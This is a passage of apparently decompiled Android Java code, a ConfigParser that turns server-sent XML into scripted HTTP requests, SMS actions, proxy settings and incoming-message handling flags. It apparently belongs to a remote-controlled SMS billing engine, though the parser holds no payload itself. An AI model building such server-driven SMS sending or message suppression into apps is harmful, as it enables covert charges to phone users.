package com.yz.business.httpsms.android;

public class ConfigParser {
    private static final String ENCODING = "UTF-8";
    private static ConfigParser instance = null;

    private ConfigParser() {
    }

    public static ConfigParser getInstace() {
        if (instance == null) {
            instance = new ConfigParser();
        }
        return instance;
    }

    public void parserServerConfig(AndroidLogic androidLogic, InputStream is) throws ParserConfigurationException, UnsupportedEncodingException, IOException, SAXException {
        DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();
        DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();
        Document doc = docBuilder.parse(new InputSource(new InputStreamReader(is, ENCODING)));
        Element root = doc.getDocumentElement();
        if (root == null) {
            throw new ParserConfigurationException("parser server config xml error");
        }
        NodeList tempNodeList = root.getElementsByTagName("svars");
        if (tempNodeList != null && tempNodeList.getLength() > 0) {
            Node node = tempNodeList.item(0);
            AndroidLogic.setLocalVars(parserLocalVars(node));
        }
        NodeList tempNodeList2 = root.getElementsByTagName("gvars");
        if (tempNodeList2 != null && tempNodeList2.getLength() > 0) {
            Node node2 = tempNodeList2.item(0);
            AndroidLogic.setGolbalVars(parserGlobalVars(node2));
        }
        NodeList tempNodeList3 = root.getElementsByTagName("rvars");
        if (tempNodeList3 != null && tempNodeList3.getLength() > 0) {
            Node node3 = tempNodeList3.item(0);
            AndroidLogic.setRawVarValues(parserRawVars(node3));
        }
        NodeList tempNodeList4 = root.getElementsByTagName("actions");
        if (tempNodeList4 != null && tempNodeList4.getLength() > 0) {
            Node node4 = tempNodeList4.item(0);
            androidLogic.setActionList(parserActionList(node4));
        }
    }

    private Vector<ActionProcessor> parserActionList(Node node) throws ParserConfigurationException, SAXException {
        Vector<ActionProcessor> actionList = new Vector<>();
        NodeList nodeList = node.getChildNodes();
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node actionNode = nodeList.item(i);
            if (actionNode.getNodeName().equals("action")) {
                actionList.addElement(parserAction(actionNode));
            }
        }
        return actionList;
    }

    private Vector<SmsItem> parserSmsService(Node node) throws ParserConfigurationException, SAXException {
        Vector<SmsItem> smsList = new Vector<>();
        NodeList nodeList = node.getChildNodes();
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node smsNode = nodeList.item(i);
            if (smsNode.getNodeName().equals(ActionProcessor.TYPE_SMS)) {
                smsList.addElement(parserSmsItem(smsNode));
            }
        }
        return smsList;
    }

    private ActionProcessor parserAction(Node node) throws ParserConfigurationException, SAXException {
        ActionProcessor actionProcessor = new ActionProcessor();
        NodeList nodeList = node.getChildNodes();
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node childNode = nodeList.item(i);
            if (childNode.hasChildNodes()) {
                if (childNode.getNodeName().equals("id")) {
                    actionProcessor.setId(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("type")) {
                    actionProcessor.setType(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("url")) {
                    int childsize = childNode.getChildNodes().getLength();
                    StringBuffer sb = new StringBuffer();
                    for (int j = 0; j < childsize; j++) {
                        sb.append(childNode.getChildNodes().item(j).getNodeValue());
                    }
                    actionProcessor.getHttpObject().setUrl(sb.toString());
                } else if (childNode.getNodeName().equals("headers")) {
                    actionProcessor.getHttpObject().setRequestHeaders(parserHttpHeaders(childNode));
                } else if (childNode.getNodeName().equals("vmethod")) {
                    int methodType = Integer.parseInt(childNode.getFirstChild().getNodeValue());
                    actionProcessor.getHttpObject().setRequestMethodType(methodType);
                } else if (childNode.getNodeName().equals("cookie")) {
                    if ("0".equals(childNode.getFirstChild().getNodeValue())) {
                        actionProcessor.getHttpObject().setUseCookie(false);
                    } else {
                        actionProcessor.getHttpObject().setUseCookie(true);
                    }
                } else if (childNode.getNodeName().equals("refer")) {
                    if ("0".equals(childNode.getFirstChild().getNodeValue())) {
                        actionProcessor.getHttpObject().setUseReferer(false);
                    } else {
                        actionProcessor.getHttpObject().setUseReferer(true);
                    }
                } else if (childNode.getNodeName().equals("vsize")) {
                    int readSize = Integer.parseInt(childNode.getFirstChild().getNodeValue());
                    actionProcessor.getHttpObject().setReadSize(readSize);
                } else if (childNode.getNodeName().equals("redict")) {
                    if ("0".equals(childNode.getFirstChild().getNodeValue())) {
                        actionProcessor.getHttpObject().setAutoRedirect(true);
                    } else {
                        actionProcessor.getHttpObject().setAutoRedirect(false);
                    }
                } else if (childNode.getNodeName().equals("postfields")) {
                    actionProcessor.getHttpObject().setOutputString(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("attstr")) {
                    actionProcessor.getHttpObject().setAttrStr(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("stime")) {
                    long stime = Long.parseLong(childNode.getFirstChild().getNodeValue());
                    actionProcessor.setSleepTime(stime);
                } else if (childNode.getNodeName().equals("goto")) {
                    actionProcessor.setEventProcessor(parserEventProcessor(childNode));
                } else if (childNode.getNodeName().equals("results")) {
                    actionProcessor.setResultProcessor(parserResultProcessor(childNode));
                } else if (childNode.getNodeName().equals(ActionProcessor.TYPE_SMS)) {
                    actionProcessor.getSmsItemList().addElement(parserSmsItem(childNode));
                } else if ("outdisposal".equals(childNode.getNodeName())) {
                    actionProcessor.setOutputDisposal(Integer.parseInt(childNode.getFirstChild().getNodeValue()));
                } else if ("indisposal".equals(childNode.getNodeName())) {
                    actionProcessor.setInputDisposal(Integer.parseInt(childNode.getFirstChild().getNodeValue()));
                } else if ("indisposal".equals(childNode.getNodeName())) {
                    actionProcessor.setInputDisposal(Integer.parseInt(childNode.getFirstChild().getNodeValue()));
                } else if (!"huafubao".equals(childNode.getNodeName())) {
                    if ("proxytype".equals(childNode.getNodeName())) {
                        actionProcessor.setProxyType(childNode.getFirstChild().getNodeValue());
                    } else if ("cleantype".equals(childNode.getNodeName())) {
                        actionProcessor.setCleanType(childNode.getFirstChild().getNodeValue());
                    }
                }
            }
        }
        return actionProcessor;
    }

    private HashMap<String, String> parserHttpHeaders(Node node) throws ParserConfigurationException, SAXException {
        HashMap<String, String> headerProperties = new HashMap<>();
        NodeList nodeList = node.getChildNodes();
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node tempNode = nodeList.item(i);
            if (tempNode.getNodeName().equals("header")) {
                NodeList headerNodeList = tempNode.getChildNodes();
                String name = null;
                String value = null;
                for (int j = 0; j < headerNodeList.getLength(); j++) {
                    Node headNode = headerNodeList.item(j);
                    if (headNode.hasChildNodes()) {
                        if (headNode.getNodeName().equals("name")) {
                            name = headNode.getFirstChild().getNodeValue();
                        } else if (headNode.getNodeName().equals("value")) {
                            value = headNode.getFirstChild().getNodeValue();
                        }
                    }
                }
                headerProperties.put(name, value);
            }
        }
        return headerProperties;
    }

    private ResultProcessor parserResultProcessor(Node node) throws ParserConfigurationException, SAXException {
        ResultProcessor resultProcessor = new ResultProcessor();
        NodeList resultNodeList = node.getChildNodes();
        for (int i = 0; i < resultNodeList.getLength(); i++) {
            Node childNode = resultNodeList.item(i);
            if (childNode.hasChildNodes()) {
                if (childNode.getNodeName().equals("encoding")) {
                    resultProcessor.setEncoding(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("rvars")) {
                    NodeList childNodeLise = childNode.getChildNodes();
                    for (int j = 0; j < childNodeLise.getLength(); j++) {
                        Node varNode = childNodeLise.item(j);
                        if (1 == varNode.getNodeType()) {
                            VarProcessor varProcessor = parserVarProcessor(varNode);
                            resultProcessor.getGlobalValueProcessVec().addElement(varProcessor);
                        }
                    }
                } else if (childNode.getNodeName().equals("preparse")) {
                    resultProcessor.setPreparse(parserVarProcessor(childNode));
                }
            }
        }
        return resultProcessor;
    }

    private VarProcessor parserVarProcessor(Node node) throws ParserConfigurationException, SAXException {
        VarProcessor varProcessor = new VarProcessor();
        NodeList varProcessorNodeList = node.getChildNodes();
        for (int i = 0; i < varProcessorNodeList.getLength(); i++) {
            Node varNode = varProcessorNodeList.item(i);
            if (varNode.hasChildNodes()) {
                if (varNode.getNodeName().equals("name")) {
                    varProcessor.setVarName(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("realname")) {
                    varProcessor.setRealName(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("vartype")) {
                    varProcessor.setVarType(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("domain")) {
                    varProcessor.setDomain(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("tagtype")) {
                    varProcessor.setTagType(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("startpoint")) {
                    varProcessor.setStartPoint(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("endpoint")) {
                    varProcessor.setEndPoint(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("attribute")) {
                    varProcessor.setAttribute(varNode.getFirstChild().getNodeValue());
                } else if (varNode.getNodeName().equals("matchs")) {
                    varProcessor.setMatchStr(parserMatchs(varNode));
                }
            }
        }
        return varProcessor;
    }

    private CondictionEventProcessor parserContionEventProcessor(Node node) throws ParserConfigurationException, SAXException {
        CondictionEventProcessor condictionEventProcessor = new CondictionEventProcessor();
        NodeList condictionNodeList = node.getChildNodes();
        for (int i = 0; i < condictionNodeList.getLength(); i++) {
            Node childNode = condictionNodeList.item(i);
            if (childNode.hasChildNodes()) {
                if (childNode.getNodeName().equals("var")) {
                    condictionEventProcessor.setVar(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("eq")) {
                    int eqType = Integer.parseInt(childNode.getFirstChild().getNodeValue());
                    condictionEventProcessor.setCalculateType(eqType);
                } else if (childNode.getNodeName().equals("val")) {
                    condictionEventProcessor.setCompareStr(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("match")) {
                    condictionEventProcessor.getMatchStrings().addElement(childNode.getFirstChild().getNodeValue());
                } else if (childNode.getNodeName().equals("goto")) {
                    condictionEventProcessor.setEventProtal(parserEventProtal(childNode));
                }
            }
        }
        return condictionEventProcessor;
    }

    private EventProcessor parserEventProcessor(Node node) throws ParserConfigurationException, SAXException {
        EventProcessor eventProcessor = new EventProcessor();
        NodeList eventProcessorNodeList = node.getChildNodes();
        for (int i = 0; i < eventProcessorNodeList.getLength(); i++) {
            Node childNode = eventProcessorNodeList.item(i);
            if (childNode.hasChildNodes()) {
                if (childNode.getNodeName().equals("errorgoto")) {
                    eventProcessor.setErrorEventProtal(parserEventProtal(childNode));
                } else if (childNode.getNodeName().equals("localgoto")) {
                    NodeList contNodeList = childNode.getChildNodes();
                    for (int j = 0; j < contNodeList.getLength(); j++) {
                        Node contNode = contNodeList.item(j);
                        if (1 == contNode.getNodeType() && contNode.getNodeName().equals("cont")) {
                            eventProcessor.addCondictionEventProcessor(parserContionEventProcessor(contNode));
                        }
                    }
                } else if (childNode.getNodeName().equals("forcegoto")) {
                    eventProcessor.setForceEventProtal(parserEventProtal(childNode));
                }
            }
        }
        return eventProcessor;
    }

    private HashMap<String, String> parserGlobalVars(Node node) throws ParserConfigurationException, SAXException {
        HashMap<String, String> globalVars = new HashMap<>();
        NodeList globalVarsNodeList = node.getChildNodes();
        for (int i = 0; i < globalVarsNodeList.getLength(); i++) {
            Node childNode = globalVarsNodeList.item(i);
            if (childNode.hasChildNodes() && childNode.getNodeName().equals("var")) {
                globalVars.put(childNode.getFirstChild().getNodeValue(), null);
            }
        }
        return globalVars;
    }

    private HashMap<String, String> parserLocalVars(Node node) throws ParserConfigurationException, SAXException {
        HashMap<String, String> localVars = new HashMap<>();
